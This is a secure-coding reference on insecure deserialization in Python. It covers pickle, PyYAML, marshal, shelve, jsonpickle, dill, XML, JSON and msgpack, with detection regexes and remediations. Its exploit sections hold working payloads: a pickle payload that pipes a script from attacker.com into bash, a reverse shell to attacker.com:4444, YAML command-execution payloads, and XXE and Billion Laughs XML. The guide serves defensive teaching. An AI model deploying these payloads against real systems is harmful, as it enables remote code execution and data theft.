# Insecure Deserialization Patterns in Python

## Overview

Insecure deserialization occurs when untrusted data is used to instantiate objects, potentially leading to remote code execution (RCE), denial of service, or other attacks.

**OWASP Classification:** A08:2021 - Software and Data Integrity Failures

---

## pickle (CRITICAL)

### Risk Level: CRITICAL

The `pickle` module is inherently unsafe for untrusted data. It can execute arbitrary code during deserialization via the `__reduce__` method.

### Detection Patterns

```regex
pickle\.loads?\s*\(
pickle\.Unpickler\s*\(
cPickle\.loads?\s*\(
_pickle\.loads?\s*\(
```

### Vulnerable Code

```python
import pickle

# Direct unpickling of user data
data = pickle.loads(request.data)
data = pickle.load(request.files['data'])

# From network
import socket
conn.recv(1024)
data = pickle.loads(received_data)

# From database (if stored by attacker)
serialized = db.query("SELECT data FROM cache WHERE key = ?", (key,))
data = pickle.loads(serialized)

# From Redis/Memcached
cached = redis_client.get(key)
data = pickle.loads(cached)
```

### Exploit Example

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

# Generate malicious payload
payload = pickle.dumps(Exploit())
# Send payload to vulnerable endpoint
```

### More Sophisticated Exploits

```python
# Using subprocess for more control
class Exploit:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['cat', '/etc/passwd'],))

# Using eval
class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

# Chained exploitation
class Exploit:
    def __reduce__(self):
        return (
            exec,
            ("import socket,subprocess,os;s=socket.socket();s.connect(('attacker.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])",)
        )
```

### Remediation

```python
# Option 1: Use JSON instead
import json
data = json.loads(request.data)

# Option 2: Use safe serialization libraries
import jsonpickle
jsonpickle.set_encoder_options('json', ensure_ascii=False)
data = jsonpickle.decode(request.data)  # Still risky, use with caution

# Option 3: HMAC verification (if pickle is absolutely required)
import hmac
import hashlib

SECRET_KEY = os.environ['PICKLE_SECRET_KEY']

def secure_dumps(obj):
    data = pickle.dumps(obj)
    sig = hmac.new(SECRET_KEY.encode(), data, hashlib.sha256).hexdigest()
    return f"{sig}:{data.hex()}"

def secure_loads(signed_data):
    sig, data_hex = signed_data.split(':')
    data = bytes.fromhex(data_hex)
    expected_sig = hmac.new(SECRET_KEY.encode(), data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(sig, expected_sig):
        raise ValueError("Invalid signature - possible tampering")
    return pickle.loads(data)

# Option 4: RestrictedUnpickler (limited protection)
import io
import pickle

SAFE_CLASSES = {
    ('myapp.models', 'User'),
    ('myapp.models', 'Product'),
}

class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if (module, name) in SAFE_CLASSES:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"Class {module}.{name} is not allowed")

def restricted_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

---

## PyYAML (CRITICAL)

### Risk Level: CRITICAL (with yaml.load), LOW (with yaml.safe_load)

### Detection Patterns

```regex
yaml\.load\s*\([^)]*\)(?!\s*,\s*Loader\s*=\s*(yaml\.)?SafeLoader)
yaml\.load\s*\([^,)]+\)$
yaml\.unsafe_load\s*\(
yaml\.full_load\s*\(
```

### Vulnerable Code

```python
import yaml

# Dangerous - allows arbitrary Python object instantiation
data = yaml.load(request.data)
data = yaml.load(file_content)
data = yaml.load(request.data, Loader=yaml.Loader)  # Still dangerous
data = yaml.load(request.data, Loader=yaml.FullLoader)  # Partially dangerous
data = yaml.unsafe_load(request.data)  # Explicitly dangerous
```

### Exploit Example

```yaml
# Execute system command
!!python/object/apply:os.system ['id']

# Execute with subprocess
!!python/object/apply:subprocess.check_output [['cat', '/etc/passwd']]

# Arbitrary code execution
!!python/object/apply:builtins.eval ['__import__("os").system("id")']

# Read files
!!python/object/apply:builtins.open ['etc/passwd']

# Complex payload
!!python/object/new:type
  args: ['exploit', !!python/tuple [], {'__reduce__': !!python/object/apply:builtins.eval ['lambda: __import__("os").system("id")']}]
```

### Remediation

```python
import yaml

# Always use safe_load
data = yaml.safe_load(request.data)

# Or explicitly specify SafeLoader
data = yaml.load(request.data, Loader=yaml.SafeLoader)

# For multiple documents
for doc in yaml.safe_load_all(file_content):
    process(doc)

# Custom safe loader with additional types
class CustomSafeLoader(yaml.SafeLoader):
    pass

def construct_custom_object(loader, node):
    # Only allow specific safe transformations
    return loader.construct_mapping(node)

CustomSafeLoader.add_constructor('!custom', construct_custom_object)
data = yaml.load(content, Loader=CustomSafeLoader)
```

---

## marshal (HIGH)

### Risk Level: HIGH

The `marshal` module can deserialize code objects, which can then be executed.

### Detection Patterns

```regex
marshal\.loads?\s*\(
```

### Vulnerable Code

```python
import marshal

# Loading code objects
code = marshal.loads(user_data)
exec(code)

# From file
with open(user_file, 'rb') as f:
    code = marshal.load(f)
```

### Remediation

```python
# Never unmarshal untrusted data
# marshal is designed for Python internal use (.pyc files)

# Use JSON or other safe formats
import json
data = json.loads(user_data)
```

---

## shelve (CRITICAL)

### Risk Level: CRITICAL

`shelve` uses `pickle` internally, inheriting all its vulnerabilities.

### Detection Patterns

```regex
shelve\.open\s*\(
```

### Vulnerable Code

```python
import shelve

# Opening shelve file with user-controlled path
db = shelve.open(user_filename)
data = db['key']

# Opening shelve with potentially tainted data
db = shelve.open('/tmp/cache')
value = db[user_key]  # If attacker can write to this file
```

### Remediation

```python
# Use SQLite or other safe storage
import sqlite3
import json

conn = sqlite3.connect('data.db')
cursor = conn.cursor()
cursor.execute("SELECT value FROM cache WHERE key = ?", (key,))
row = cursor.fetchone()
data = json.loads(row[0]) if row else None
```

---

## jsonpickle (HIGH)

### Risk Level: HIGH

While safer than pickle, jsonpickle can still deserialize arbitrary objects if configured unsafely.

### Detection Patterns

```regex
jsonpickle\.decode\s*\(
jsonpickle\.unpickler
```

### Vulnerable Code

```python
import jsonpickle

# Default settings may allow dangerous objects
data = jsonpickle.decode(user_input)

# With unsafe settings
jsonpickle.set_decoder_options('json', decode_function=True)
data = jsonpickle.decode(user_input)
```

### Remediation

```python
import jsonpickle

# Use safe mode
data = jsonpickle.decode(user_input, safe=True)

# Or use plain JSON
import json
data = json.loads(user_input)
```

---

## dill (CRITICAL)

### Risk Level: CRITICAL

`dill` extends `pickle` and shares all its vulnerabilities, often with additional capabilities.

### Detection Patterns

```regex
dill\.loads?\s*\(
```

### Vulnerable Code

```python
import dill

# Same vulnerabilities as pickle
data = dill.loads(user_data)
```

### Remediation

```python
# Same as pickle - never deserialize untrusted data
# Use JSON or other safe serialization formats
```

---

## XML Deserialization

### Risk Level: HIGH (XXE), MEDIUM (Billion Laughs)

### Detection Patterns

```regex
xml\.etree\.ElementTree\.(parse|fromstring)\s*\(
lxml\.etree\.(parse|fromstring)\s*\(
xml\.dom\.minidom\.parse\s*\(
xml\.sax\.parse\s*\(
```

### Vulnerable Code

```python
from xml.etree.ElementTree import parse, fromstring
from lxml import etree

# XXE vulnerable
tree = parse(user_file)
root = fromstring(user_xml)

# lxml default may be vulnerable
doc = etree.parse(user_file)
```

### Exploit Examples

```xml
<!-- XXE: Read local files -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>

<!-- XXE: SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin">
]>
<data>&xxe;</data>

<!-- Billion Laughs (DoS) -->
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... continues ... -->
]>
<lolz>&lol9;</lolz>
```

### Remediation

```python
# Use defusedxml (safe by default)
import defusedxml.ElementTree as ET
tree = ET.parse(user_file)
root = ET.fromstring(user_xml)

# For lxml, disable dangerous features
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
doc = etree.parse(user_file, parser)

# Or use defusedxml with lxml
from defusedxml.lxml import parse
doc = parse(user_file)
```

---

## JSON (Generally Safe)

### Risk Level: LOW

Standard JSON is safe, but custom decoders can introduce vulnerabilities.

### Potentially Vulnerable Patterns

```regex
json\.loads?\s*\([^)]*object_hook
json\.loads?\s*\([^)]*cls\s*=
JSONDecoder\s*\([^)]*object_hook
```

### Vulnerable Code

```python
import json

# Custom object_hook can be dangerous
def dangerous_hook(d):
    if '__class__' in d:
        # Instantiating arbitrary classes
        cls = eval(d['__class__'])
        return cls(**d['data'])
    return d

data = json.loads(user_input, object_hook=dangerous_hook)
```

### Safe Usage

```python
import json

# Default JSON parsing is safe
data = json.loads(user_input)

# Safe custom decoder
def safe_hook(d):
    ALLOWED_TYPES = {'User', 'Product'}
    if '__type__' in d and d['__type__'] in ALLOWED_TYPES:
        # Explicitly map to safe classes
        if d['__type__'] == 'User':
            return User(name=d.get('name'))
    return d

data = json.loads(user_input, object_hook=safe_hook)
```

---

## msgpack (MEDIUM)

### Risk Level: MEDIUM

MessagePack has extension types that can be abused.

### Detection Patterns

```regex
msgpack\.(loads?|unpack)\s*\([^)]*ext_hook
msgpack\.Unpacker\s*\([^)]*ext_hook
```

### Vulnerable Code

```python
import msgpack

# Dangerous ext_hook
def dangerous_ext_hook(code, data):
    if code == 1:
        return pickle.loads(data)  # RCE!
    return msgpack.ExtType(code, data)

data = msgpack.loads(user_input, ext_hook=dangerous_ext_hook)
```

### Safe Usage

```python
import msgpack

# Default usage is safe
data = msgpack.loads(user_input)

# Safe custom extension
def safe_ext_hook(code, data):
    if code == 1:
        # Only handle known safe extensions
        return data.decode('utf-8')
    raise ValueError(f"Unknown extension type: {code}")

data = msgpack.loads(user_input, ext_hook=safe_ext_hook)
```

---

## Summary Table

| Library | Risk Level | Safe Alternative |
|---------|------------|------------------|
| pickle | CRITICAL | JSON, msgpack |
| cPickle | CRITICAL | JSON, msgpack |
| yaml.load | CRITICAL | yaml.safe_load |
| marshal | HIGH | JSON |
| shelve | CRITICAL | SQLite + JSON |
| dill | CRITICAL | JSON |
| jsonpickle | HIGH | JSON (with safe=True) |
| xml.etree | HIGH (XXE) | defusedxml |
| lxml | HIGH (XXE) | defusedxml.lxml |
| msgpack | MEDIUM | Default usage safe |
| json | LOW | Default usage safe |
